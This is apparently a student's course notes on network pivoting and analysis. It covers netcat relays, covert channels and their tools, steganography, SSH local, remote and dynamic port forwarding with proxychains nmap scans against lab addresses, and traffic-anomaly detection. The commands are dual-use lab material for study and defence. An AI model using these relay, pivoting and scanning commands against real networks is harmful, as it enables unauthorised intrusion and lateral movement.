        nc 172.16.82.115 9876 < mypipe | nc 10.10.0.40 > mypipe 3333

      on internet host:
        nc -lvp 3333 > question4.txt
        

 ## SSH TUNNELING AND COVERT CHANNELS

 ## COVERT CHANNELS VS STEGANOGRAPHY
 https://net.cybbh.io/-/public/-/jobs/868185/artifacts/modules/networking/slides-v4/08_tunneling.html

     **TYPE OF COVERT CHANNELS**
     Storage
       Payload
       Header
         IP Header (TOS, IP ID, Flags + Fragmentation, and Options)
         TCP Header (Reserved, URG Pointer, and Options)


      Timing
        Modifying transmission of legitimate traffic
        Delaying packets between nodes
        Watch TTL changes
        Watch for variances between transmissions

      common protocols used with covert channels:
      ICMP
      DNS
      HTTP

      **HOW TO DETECT COVERT CHANNELS**
      Host Analysis
         Requires knowledge of each applications expected behavior.
         
      Network Analysis
         A good understanding of your network and the common network protocols being used is the key
         
      Baselining of what is normal to detect what is abnormal

     **DETECTING COVERT CHANNELS WITH ICMP**
     ICMP works with one request and one reply answer
       Type 8 code 0 request
       Type 0 code 0 answer
     Check for:
      Payload imbalance
      Request/responce imbalance 
      Large payloads in response
           
       **ICMP COVERT CHANNEL TOOLS**
       1. ptunnel
       2. loki
       3. 007shell
       4. ICMP Backdoor
       5. B0CK
       6. Hans

       **DETECTING COVERT CHANNELS WITH DNS**
       DNS is a request/response protocol

     1 request typically gets 1 response
     Payloads generally do no exceed 512 bytes
     Check for:
        Request/response imbalances
        Unusual payloads
        Burstiness or continuous use

        **DNS COVERT CHANNEL TOOLS**
        1.OzymanDNS
        2.NSTX
        3.dns2tcp
        4.iodine
        5.heyoka
        6.dnscat2

        **DETECTING COVERT CHANNELS WITH HTTP**
        Request/Response protocol to pull web content
        GET request may include .png, .exe, .(anything) files
        Can vary in sizes of payloads
        Typically "bursty" but not steady

       **HTTP COVERT CHANNEL TOOLS**
       1. tunnelshell tools
       2. HTTPTunnel
       3. SirTunnel
       4. go HTTP tunnel

## STEGANOGRAPHY

    Hiding messages inside legitimate information objects

      Methods:
       injection
       substitution
       propagation

       **STEGANOGRAPHY INJECTION**

       Done by inserting message into the unused (whitespace) of the file, usually in a graphic
       Second most common method
       Adds size to the file
       Hard to detect unless you have original file
       tools:
        StegHide

     **STEGANOGRAPHY SUBSTITUTION**
     Done by inserting message into the insignificant portion of the file
     Most common method used
     Elements within a digital medium are replaced with hidden information
     Example
        Change color pallate (+1/-1)

     **STEGANOGRAPHY PROPAGATION**

     Generates a new file entirely
     Needs special software to manipulate file

    tools:
    StegSecret
    HyDEn
    Spammimic



  ## SSH LOCAL PORT FORWARDING

     ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT

     or
     
     ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT

  ## SSH Local Port Forwarding to SSH (run from internet_host)

      Internet_Host:
     ssh student@172.16.1.15 -L 1112:172.16.40.10:80 -NT
     firefox localhost:1112
     
     ssh student@172.16.1.15 -L 1113:172.16.40.10:23 -NT
     telnet localhost 1113
     
     ssh student@172.16.1.15 -L 1113:172.16.40.10:3389 -NT
     xfreerdp /v:localhost:1113 /u:student /p:password

## SSH Local Port Forwarding Through a Local Port

    Internet Host:
    ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
    
    ssh student@localhost -p 1111 -L 2220:172.16.82.106:22 -NT
    
    ssh student@localhost -p 2220
    
    ssh student@localhost -p 1111 -L 2221:172.16.82.106:23 -NT
    telnet localhost 2221
    
    ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
    firefox localhost:2222
    
    ssh student@localhost -p 1111 -L 2223:172.16.82.106:3389 -NT
    xfreerdp /v:localhost:2223 /u:student /p:password

 ## SSH Dynamic Port Forwarding (only use port 9050) (run from internet_host)

     ssh -D <port> -p <alt port> <user>@<pivot ip> -NT

 ## SSH Dynamic Port Forwarding 1-Step

     Internet_Host:
    ssh student@172.16.1.15 -D 9050 -NT
    
    proxychains ./scan.sh
    proxychains nmap -Pn 172.16.40.0/27 -p 21-23,80
    proxychains ssh student@172.16.40.10
    proxychains telnet 172.16.40.10
    proxychains wget -r http://172.16.40.10
    proxychains wget -r ftp://172.16.40.10

 ## SSH Dynamic Port Forwarding 2-Step

    Internet_Host:
    ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
    ssh student@localhost -p 1111 -D 9050 -NT
    
    proxychains ./scan.sh
    proxychains nmap -Pn 172.16.82.96/27 -p 21-23,80
    proxychains ssh student@172.16.82.106
    proxychains telnet 172.16.82.106
    proxychains wget -r http://172.16.82.106
    proxychains wget -r ftp://172.16.82.106

 ## SSH Remote Port Forwarding

     ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT

     or
     
     ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT

     **Creates 1111 on the Internet_Host mapped to Blue_DMZ_Host-1 own localhost port 22**
     Blue_DMZ_Host-1:
     ssh student@10.10.0.40 -R 1111:localhost:22 -NT
     
     or
     
     ssh -R 1111:localhost:22 student@10.10.0.40 -NT

     **Creates a remote port on the remote’s local host that forwards to the target specified**
     Blue Host-1:
     ssh student@10.10.0.40 -R 1111:localhost:22 -NT
     
     Internet_Host:
     ssh student@localhost -p 1111 -D 9050 -NT

  ## SSH Remote and Local Port Forwarding

      **Creates a remote port on a remote machine, staging a connection
       Also creates a local port on the localhost to connect to the previously staged connection**

       Blue Private Host-1:
       ssh student@192.168.1.1 -R 1111:localhost:22 -NT
       
       Internet Host:
       ssh student@172.16.82.106 -L 2222:localhost:1111 -NT
       
       Internet Host:
       ssh localhost -p 2222 -D 9050 -NT


## Network Analysis


      **TOOLS**
      Sensors
          In-Line
            Test Access Point (TAP)
            Man-in-the-Middle (MitM)
          Out of Band (Passive)
            Switched Port Analyzer (SPAN)

       **IN-LINE SENSOR**
       Placed between communicating devices to stop attacks
           Intrusion Prevention System (IPS)
           Firewall
       Impacts network latency

       PASSIVE SENSOR
       Monitors network segments
       Can detect attacks but cannot stop them
       Gets copies of network traffic
         Intrusion Detection System (IDS)
       Does not impact network latency

       TAP
       Appliance placed between 2 network devices
       Best for packet collection with no data loss
       Must be placed "in line" of network traffic
       Not Scalable
       Will need several installed to capture traffic for other network segments

       MITM
      Attacker can use ARP or some other method/protocol
      Attackers can sniff or manipulate traffic that flows through them
      Typically must be on the same network as the victim
      Traffic capture is dependent on the attacker’s system and bandwidth
      there are different types of MITM attacks

      SPAN
     Configured on the network Switch
     Best for packet collection of traffic from several switch ports at once
     Scalable
     Can have a high degree of packet loss
     Places burden on the network Switch

      **IDENTIFY DEFAULT CHARACTERISTICS FOR SYSTEM IDENTIFICATION**
      FINGERPRINTING AND HOST IDENTIFICATION
     Variances in the RFC implementation for different OS’s and systems enables the capability for fingerprinting
     Tools used for fingerprinting and host identification can be used passively(sniffing/fingerprinting) or actively(scanning)

     **FINGERPRINTING**

     Active OS fingerprinting

     Easier
     Send packets to the target and monitor response
     Tools:
       Nmap
       Xprobe2
       sinfp3

     **FINGERPRINTING**
     Passive OS fingerprinting

     More difficult
     Rely on sniffing packets
     Tools:
        p0f
        Ettercap
        PRADS

        **OPEN PORTS AND PROTOCOLS**
        Known Windows/Linux ports
        Known Windows/Linux protocols
        Banner grab service ports

    **EPHEMERAL PORTS**
    IANA 49152–65535
    Linux 32768–60999
    Windows XP 1025–5000
    Win 7/8/10 use IANA
    Win Server 2008 1025–60000
    Sun Solaris 32768–65535

    **PROTOCOL SPECIFIC IDENTIFIERS**
    HTTP: User-agent strings
    SSH: Initial connection
    NetBIOS Name Service

    **P0F (PASSIVE OS FINGERPRINTING)**
    Looks at variations in initial TTL, fragmentation flag, default IP header packet length, window size, and TCP options
    Configuration stored in:
       /etc/p0f/p0f.fp

    **PERFORM NETWORK TRAFFIC BASELINING**
    PERFORM BASELINING

    Preparation:
      Network Diagram
      Known Servers, Hosts, and Networking devices
      Known IPs, ports, and protocols
      Known forbidden IPs, ports, and protocols
      Known traffic "flows"

      Scope and Objectives:
         What traffic/protocols to capture?
         Which network segments?
         Which days?
         What times?

     **DETERMINE TRAFFIC FLOW THROUGH PROTOCOL COMMUNICATION ANALYSIS**
     on wireshark:
       Protocol Hierarchy
       Conversations
       Endpoints
       I/O Graph
       IPv4 and IPv6 Statistics
       Expert Information

       ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/a49868b7-6b91-4988-910c-e074d90680ff)
       ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/0bbf0bf1-18ed-414d-b9a0-2a5ffc763c30)

       **Indicators:**
        **ANOMALY DETECTION**
        indicator of Attack (IOA)
          Proactive
          A series of actions that are suspicious together
          Focus on Intent
          Looks for what must happen
            Code execution. persistence, lateral movement, etc.

        Indicator of Compromise (IOC)
           Reactive
           Forensic Evidence
           Provides Information that can change
             Malware, IP addresses, exploits, signatures

           **SOME INDICATORS**
           .exe/executable files
           NOP sled
           Repeated Letters
           Well Known Signatures
           Mismatched Protocols
           Unusual traffic
           Large amounts of traffic/ unusual times

      **Signs of IOA**
      Destination IP/Ports
      Public Servers/DMZs
      Off-Hours
      Network Scans
      Alarm Events
      Malware Reinfection
      Remote logins
      High amounts of some protocols

      **Signs of IOC**
      Unusual traffic outbound
      Anomalous user login or account use
      Size of responses for HTML
      High number of requests for the same files
      Using non-standard ports/ application-port mismatch
      Writing changes to the registry/system files
      Unexpected/unusual patching or tasks

      **Types of Malware**
      **ADWARE/SPYWARE**
      large amounts of traffic/ unusual traffic
      IOA
        Destinations
      IOC
        Unusual traffic outbound

        **VIRUS**
        phishing/ watering hole
        IOA
          Alarm Events, Email protocols
        IOC
          Changes to the registry/ system files

        **WORM**
        phishing/ watering hole
        IOA
          Alarm events
        IOC
          changes to registry/ system files

          **TROJAN**
          beaconing
          IOA
            Destinations
          IOC
            Unusual traffic outbound, unusual tasks, changes to registry/ system files

            **ROOTKIT**
            IOA
              Malware reinfection
            IOC
              Anomalous user login/ account use

         **BACKDOOR**
         IOA
           Remote logins
         IOC
           Anomalous user login/ account use

        **BOTNETS**
        large amounts of IPs
        IOA
          Destinations, remote logins
        IOC
          Unusual tasks, anomalous user login/ account use

          **DETERMINE NETWORK ANOMALIES THROUGH TRAFFIC ANALYSIS**
          ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/4184d7af-cd04-4259-ac91-39a1928684c1)
          ICMP TUNNELING

          ICMP PING uses Type 8 and Type 0
          Both should be:
             1 for 1
             Same size and payload
          Look out for:
             Request/Reply imbalances
             Abnormal/different payloads

             **DNS TUNNELING**
             ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/b1b2e55b-178d-4fb1-a846-126dc80a1e7c)

             DNS uses Query/Response
               1 Query typically gets 1 response
             Look out for:
                Query/Response imbalances
                Abnormal/different payloads
                Continuous Queries

            **HTTP(S) TUNNELING**
            HTTP is "bursty" in nature
            Client issues request and the server responds
            Look out for:
               Steady connections
               HTTPs you will need to check session establishment for abnormalities

          **BEACONING**
          Call back to the C&C server
          Gets/sends commands from/to C&C
          Look out for:
             Beacon Timing
             Commonly at regular intervals
          Beacon Size
             Check-Ins may not have any payloads
             Orders will have payloads
          
                   

             

             

          
          
          

          

          
        
         

          
            

          
          

          
      

      
      
      

      

           
           
     
       
       
       

       

     

    
    

       
    

    
    
        

        
        
     
          

     
      
      
       

       
    

     
          
             
         
           
           
        



        

        
                
               
       
      
      
      
      


      

      

    

    
    

    
        

      

        

        
        
        
        
        
        

        

        
        
        

        
        

        
        

        
        

        
        
        
        
        
        




        

        
        
        

        
        

    



     

     
     
     
     
     

     

     
     

     
     
     

     

     
     
     
     
     
     
           
    
    

    
    
    
    
    
    

    
    
    

    
    
    

    

    

      
      
      
         
        
        
       
        

       
       
       

       
            

           
            
            
            
            
                         

             

        
       
        
         
      

       
     
          
      
       

     

     
     

     







     
 

    
    
   
    
     
    
     

 

 
       


 





       
      
      













    

     

 

      

    

  

   
    



    



     
    


    

    

     
    

       
 

      




    


    

 
    


  


    


     


     


  


      
    
  



     




   

           
  

 
        
      
  



    
     

        
      
     
    
 

    

    


   
     

    
     

       
     




    
  

      


     



    
    
